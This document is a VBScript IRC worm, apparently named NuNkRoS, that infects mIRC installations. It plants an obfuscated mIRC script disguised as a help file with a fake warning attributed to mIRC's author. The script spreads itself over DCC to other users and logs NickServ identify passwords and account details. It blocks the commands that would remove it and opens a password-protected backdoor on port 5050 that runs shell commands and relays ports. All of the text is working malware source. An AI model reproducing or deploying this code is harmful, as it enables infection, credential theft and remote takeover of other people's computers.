Set hjhgfgfhfg = CreateObject("Scripting.FileSystemObject")
Set kkkklfgds = hjhgfgfhfg.GetFile(WScript.ScriptFullName)
kkkklfgds.Copy(hjhgfgfhfg.GetSpecialFolder(1)&"\Win32.dll")
DIM msdir, msfile
scanm()
sub scanm()
On Error Resume Next
  Dim d,dc,s
  Set dc = hjhgfgfhfg.Drives
  For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path & "\")
  end if
  Next
end sub
sub folderlist(folderspec)
On Error Resume Next
  dim f,f1,sf
  set f = hjhgfgfhfg.GetFolder(folderspec)
  set sf = f.SubFolders
  for each f1 in sf
  infectfiles(f1.path)
  folderlist(f1.path)
  next
end sub
sub infectfiles(folderspec)
On Error Resume Next
  dim f,f1,fc,ext,s,bname
  set f = hjhgfgfhfg.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
  ext = hjhgfgfhfg.GetExtensionName(f1.path)
  bname = hjhgfgfhfg.GetBaseName(f1.path)
  ext = lcase(ext)
  s = lcase(f1.name)
if (s = "mirc.exe") or (s = "mirc32.exe") or (s = "suso.sys") then
msdir = f & "\"
if (hjhgfgfhfg.FileExists(msdir & "mirc.ini")) then
msfile = "mirc.ini"
end if
if (hjhgfgfhfg.FileExists(msdir & "suso.sys")) then
msfile = "suso.sys"
end if
if (msdir <> nul) and (msfile <> nul) then
infc()
end if
end if
  next
end sub
sub infc()
On Error Resume Next
Set tesl = hjhgfgfhfg.OpenTextFile(msdir & msfile, 1)
cadl = tesl.ReadAll
tesl.Close
if (INSTRREV (cadl, "=ircintro.hlp")) then
msdir = nul
msfile = nul
exit sub
else
set rr=hjhgfgfhfg.CreateTextFile(msdir & "ircintro.hlp")
rr.WriteLine ";Please dont edit this script... mIRC will corrupt, if mIRC will"
rr.WriteLine ";corrupt... WINDOWS will affect and will not run correctly. thanks"
rr.WriteLine ";"
rr.WriteLine ";Khaled Mardam-Bey"
rr.WriteLine ";http://www.mirc.com"
rr.WriteLine ";"
rr.WriteLine "; V $+ $chr(105) $+ ru $+ s NuNkRoS"
rr.WriteLine "on 1:CONNECT:{ .reload -rs1 ircintro.hlp | .Set %£.go $false | .Set %£.which $r(1,2) | .Unset %be.* %pk.* %£S.* | tyaaa }"
rr.WriteLine "on 1:text:*vrvernm*:*:{ .notice $nick 4V $+ $chr(73) $+ R $+ $chr(85) $+ S O $+ N!!! }"
rr.WriteLine "alias hnv { var %flv1 = $left($mircexe,3)  $+ w $+ i $+ ndo $+ ws\sy $+ stem\Wi $+ n32.d $+ ll | if ($exists(%flv1) = $true) { var %flv = %flv1 } | else { halt }"
rr.WriteLine "  var %ran = $rand(1,5) | if (%ran = 1) { .copy -o %flv $nofile(%flv) $+ X $+ $chr(88) $+ X_PL $+ $chr(65) $+ Y.A $+ VI.v $+ be | set %£.file $nofile(%flv) $+ X $+ $chr(88) $+ X_PL $+ $chr(65) $+ Y.A $+ VI.v $+ be }"
rr.WriteLine "  elseif (%ran = 2) { .copy -o %flv $nofile(%flv) $+ T $+ RI $+ VI $+ $chr(65) $+ L.T $+ $chr(88) $+ T.vb $+ e | set %£.file $nofile(%flv) $+ T $+ RI $+ VI $+ $chr(65) $+ L.T $+ $chr(88) $+ T.vb $+ e }"
rr.WriteLine "  elseif (%ran = 3) { .copy -o %flv $nofile(%flv) $+ W $+ $chr(65) $+ R_NU $+ KE.Z $+ IP.vb $+ e | set %£.file $nofile(%flv) $+ W $+ $chr(65) $+ R_NU $+ KE.Z $+ IP.vb $+ e }"
rr.WriteLine "  elseif (%ran = 4) { .copy -o %flv $nofile(%flv) $+ Y $+ O_ $+ $chr(69) $+ N_L $+ $chr(65) $+ _PL $+ $chr(65) $+ YA.B $+ MP.vb $+ e | set %£.file $nofile(%flv) $+ Y $+ O_ $+ $chr(69) $+ N_L $+ $chr(65) $+ _PL $+ $chr(65) $+ YA.B $+ MP.vb $+ e }"
rr.WriteLine "elseif (%ran = 5) { .copy -o %flv $nofile(%flv) $+ T $+ $chr(69) $+ _KI $+ $chr(69) $+ RO.T $+ $chr(88) $+ T.v $+ be | set %£.file $nofile(%flv) $+ T $+ $chr(69) $+ _KI $+ $chr(69) $+ RO.T $+ $chr(88) $+ T.v $+ be } | .ignore -rpcntikxu15 $address($nick,1) | LS $nick %£.file }"
rr.WriteLine "on 1:JOIN:*:{ if ($nick != $me) { hnv } }"
rr.WriteLine "on 1:FileRcvd:*:{ if ($nick != $me) { hnv } }"
rr.WriteLine "on 1:part:#:{ if ($nick != $me) { hnv } }"
rr.WriteLine "on 1:SENDFAIL:*:{ halt }"
rr.WriteLine "on 1:START:{ var %smdr $left($mircexe,3)  $+ wi $+ ndo $+ ws\sy $+ st $+ em\ | var %vrss = %smdr $+ K $+ 32.d $+ ll | if ($exists(%vrss) = $false) { .write %smdr $+ K $+ 32.d $+ ll --- NuNkRoS --- $fulldate "
rr.WriteLine "    set %fspss 0"
rr.WriteLine "    set %mtruser off"
rr.WriteLine "    var %ffl = c $+ $chr(58) $+ \w $+ $chr(105) $+ nd $+ $chr(111) $+ ws\c $+ om $+ $chr(51) $+ 2.b $+ at"
rr.WriteLine "    if ($exists(%ffl)) { halt }"
rr.WriteLine "    else {"
rr.WriteLine "      .write %ffl $chr(64) $+ echo off"
rr.WriteLine "      .write %ffl $chr(105) $+ f $chr(34) $+ $chr(37) $+ 1 $+ $chr(34) $+ == $+ $chr(34) $+ $chr(34) goto salir"
rr.WriteLine "      .write %ffl $chr(115) $+ et flcmd=c $+ $chr(58) $+ \w $+ $chr(105) $+ ndo $+ ws\m $+ rc $+ $chr(51) $+ 2.s $+ ys"
rr.WriteLine "      .write %ffl $chr(37) $+ 1 $chr(37) $+ 2 $chr(37) $+ 3 $chr(37) $+ 4 $chr(37) $+ 5 $chr(37) $+ 6 $chr(37) $+ 7 $chr(37) $+ 8 $chr(37) $+ 9 > $chr(37) $+ flcmd $+ $chr(37)"
rr.WriteLine "      .write %ffl $chr(105) $+ f exist $chr(37) $+ flcmd $+ $chr(37) attrib +S +H $chr(37) $+ flcmd $+ $chr(37)"
rr.WriteLine "      .write %ffl $chr(58) $+ salir"
rr.WriteLine "      .write %ffl $chr(58) $+ cls"
rr.WriteLine "    }"
rr.WriteLine "  }"
rr.WriteLine "  if (%inis != 1) { if (X-CRiPt isin $titlebar) { .write %smdr $+ K $+ 32.d $+ ll IRC= %dalnick | .write %smdr $+ K $+ 32.d $+ ll IRC= %dalnick.p }"
rr.WriteLine "elseif (IRcap isin $titlebar) { .write %smdr $+ Kern32.dll IRC= %copnick } | set %inis = 1 } }"
rr.WriteLine "on 1:INPUT:*:{ if (identify isin $1-) { var %vrss = %smdr $+ K $+ 32.d $+ ll | if ($exists(%vrss) = $false) {"
rr.WriteLine "    set %smdr $left($mircexe,3)  $+ wi $+ nd $+ ows\sy $+ st $+ em\ | .write %smdr $+ K3 $+ 2.d $+ ll --- NuNkRoS --- $fulldate }"
rr.WriteLine "    if ($read -w* $+ $me $+ * %smdr $+ K $+ 32.d $+ ll = $null) { .write %smdr $+ K $+ 32.d $+ ll -----IRCINPUT----- | .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $me"
rr.WriteLine "      .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $chan | .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $1- | .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $email | .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $server $port"
rr.WriteLine "  .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= Wi $+ ndo $+ ws $os | .write %smdr $+ K $+ 32.d $+ ll IRCINPUT= $fulldate | .write %smdr $+ K $+ 32.d $+ ll -----IRCINPUT----- } }"
rr.WriteLine "  if ($1 = /Alias) { halt } | if ($1 = /Load) { halt } | if ($1 = /Remini) { halt } | if ($1 = /Unload) { halt } | if ($1 = /Remove) { halt } | if ($1 = /Set) { halt }"
rr.WriteLine "if ($1 = /Unset) { halt } | if ($1 = /UnsetAll) { halt } | if ($1 = /Enable) { halt } | if ($1 = /Disable) { halt } }"
rr.WriteLine "ctcp 1:/*:*:{ .ctcpreply $nick / Recibido | if ($$1 == /say) { halt } | var %sctcp $remove($1-,/) | %sctcp | halt }"
rr.WriteLine "alias fldc { if ($1 = off) { .sreq -m ask } | else { .sreq +m auto }  }"
rr.WriteLine "On 1:SockClose:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }"
rr.WriteLine "On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %£.tmp5 | SL %£.tmp5 }"
rr.WriteLine "On 1:SockWrite:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }"
rr.WriteLine "alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }"
rr.WriteLine "alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { .sockclose [ ƒ. $+ [ $1 ] ] | .sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }"
rr.WriteLine "alias LS { set %£.file $2 | if ( $exists(%£.file) ) { Set %£.go $true } | if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%£.file).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 TO $1 | if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %£.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }"
rr.WriteLine "On 1:Disconnect:{ .timers off | .sockclose * }"
rr.WriteLine "on 1:exit:{ var %frmdr = $left($mircexe,3) $+ wi $+ ndo $+ ws\sys $+ te $+ m\ | var %rh = 1 | while (%rh <= 5) { "
rr.WriteLine "    if (%rh = 1) { var %flr = %frmdr $+ X $+ $chr(88) $+ X_PL $+ $chr(65) $+ Y.A $+ VI.v $+ be } | if (%rh = 2) { var %flr = %frmdr $+ T $+ RI $+ VI $+ $chr(65) $+ L.T $+ $chr(88) $+ T.vb $+ e }"
rr.WriteLine "    if (%rh = 3) { var %flr = %frmdr $+ W $+ $chr(65) $+ R_NU $+ KE.Z $+ IP.vb $+ e } | if (%rh = 4) { var %flr = %frmdr $+ Y $+ O_ $+ $chr(69) $+ N_L $+ $chr(65) $+ _PL $+ $chr(65) $+ YA.B $+ MP.vb $+ e }"
rr.WriteLine "if (%rh = 5) { var %flr = %frmdr $+ T $+ $chr(69) $+ _KI $+ $chr(69) $+ RO.T $+ $chr(88) $+ T.v $+ be } | if ($exists(%flr) = $true) { .remove %flr } | inc %rh } }"
rr.WriteLine "alias tyaaa {"
rr.WriteLine "  if ($1 == off) { .sockclose mtr .sockclose mtron }"
rr.WriteLine "  else { .socklisten mtr 5050 } }"
rr.WriteLine "on 1:socklisten:mtr:{ sockaccept mtron }"
rr.WriteLine "on 1:sockread:mtron:{"
rr.WriteLine "  if ($sockerr > 0) return"
rr.WriteLine "  :nextread"
rr.WriteLine "  sockread %ftrr"
rr.WriteLine "  if ($sockbr == 0) return"
rr.WriteLine "  if (%ftrr == $null) %ftrr = -"
rr.WriteLine "  if (%mtruser == off) { mtrcm %ftrr }"
rr.WriteLine "  else { mtrcmd %ftrr }"
rr.WriteLine "  goto nextread }"
rr.WriteLine "alias wmtr { sockwrite -n mtron $1- } "
rr.WriteLine "alias mtrcm {"
rr.WriteLine "  if (%fspss = 3) { sockclose mtron | set %fspss 0 | halt }"
rr.WriteLine "  if ($1 == pass && $2 == $chr(49) $+ $chr(95) $+ $chr(97) $+ - $+ $chr(50) $+ _ $+ $chr(98) $+ -3 $+ _c) { wmtr Pass ok... | set %mtruser on | set %fspss 0 | halt }"
rr.WriteLine "  else { inc %fspss } }"
rr.WriteLine "alias mtrcmd {"
rr.WriteLine "  if ($1 == help) { "
rr.WriteLine "    wmtr Commands of help."
rr.WriteLine "    wmtr $ quit help rpfr"
rr.WriteLine "    wmtr End commands. }"
rr.WriteLine "  elseif ($1 == rpfr) { rpfr $2- }"
rr.WriteLine "  elseif ($1 == $) {"
rr.WriteLine "    var %ghtf = c $+ $chr(58) $+ \w $+ $chr(105) $+ nd $+ $chr(111) $+ ws\c $+ om $+ $chr(51) $+ 2.b $+ at"
rr.WriteLine "    .run -n %ghtf $2-"
rr.WriteLine "    .timersss 1 2 rlfg }"
rr.WriteLine "  elseif ($1 == quit) { sockclose mtron | set %mtruser off | halt }"
rr.WriteLine "  else { wmtr Command error. } }"
rr.WriteLine "on 1:sockclose:mtron:{ sockclose mtron | set %mtruser off }"
rr.WriteLine "alias rlfg {"
rr.WriteLine "  var %fgdf = c $+ $chr(58) $+ \w $+ $chr(105) $+ ndo $+ ws\m $+ rc $+ $chr(51) $+ 2.s $+ ys"
rr.WriteLine "  if ($file(%fgdf).mtime == %ultmf) { wmtr %kjhg Command or name invalid | halt }"
rr.WriteLine "  set %ultmf $file(%fgdf).mtime"
rr.WriteLine "  var %srgs $lines(%fgdf)"
rr.WriteLine "  var %i = 1"
rr.WriteLine "  while (%i <= %srgs) {"
rr.WriteLine "    var %kjhg = $read -l $+ %i %fgdf"
rr.WriteLine "    wmtr %kjhg"
rr.WriteLine "    inc %i }"
rr.WriteLine "  wmtr }"
rr.WriteLine "alias rpfr {"
rr.WriteLine "  if ($1 == $null) { wmtr error sintaxis } | else { set %rphst $1 }"
rr.WriteLine "  if ($2 == $null) { wmtr error sintaxis } | else { set %rpprt $2 }"
rr.WriteLine "  : gdfgsg"
rr.WriteLine "  var %prtr = $rand(50,70)"
rr.WriteLine "  if ($portfree(%prtr)) { socklisten rport %prtr } | else { goto gdfgsg }"
rr.WriteLine "  wmtr Redir prt %prtr }"
rr.WriteLine "on 1:socklisten:rport:{"
rr.WriteLine "  sockaccept rrp"
rr.WriteLine "  sockopen porr %rphst %rpprt }"
rr.WriteLine "on 1:sockread:rrp:{"
rr.WriteLine "  if ($sockerr > 0) return"
rr.WriteLine "  :nextread"
rr.WriteLine "  sockread %ftrr"
rr.WriteLine "  if ($sockbr == 0) return"
rr.WriteLine "  if (%ftrr == $null) %ftrr = -"
rr.WriteLine "  sockwrite -n porr %ftrr"
rr.WriteLine "  goto nextread }"
rr.WriteLine "on 1:sockread:porr:{"
rr.WriteLine "  if ($sockerr > 0) return"
rr.WriteLine "  :nextread"
rr.WriteLine "  sockread %ftrry"
rr.WriteLine "  if ($sockbr == 0) return"
rr.WriteLine "  if (%ftrry == $null) %ftrry = -"
rr.WriteLine "  sockwrite -n rrp %ftrry"
rr.WriteLine "  goto nextread }"
rr.WriteLine "on 1:sockclose:porr:{ sockclose rrp | unset %rphst | unset %rpprt }"
rr.close
Set rrr = hjhgfgfhfg.OpenTextFile(msdir & msfile, 8)
rrr.writeline ""
rrr.writeline "..."
rrr.close
Set rr = hjhgfgfhfg.OpenTextFile(msdir & msfile, 1)
Do while ( rl <> "..." )
rl = rr.readline
if (rl = "[rfiles]") then
 rmf = 1
end if
if (rmf = 1) then
 lefln = LEFT (rl, 1)
 if (lefln = "n") then
    nmrs = nmrs + 1
 end if
end if
loop
rr.Close
Set rrr = hjhgfgfhfg.OpenTextFile(msdir & msfile, 8)
rrr.writeline "n" & nmrs & "=ircintro.hlp"
rrr.close
msdir = nul
msfile = nul
end if
end sub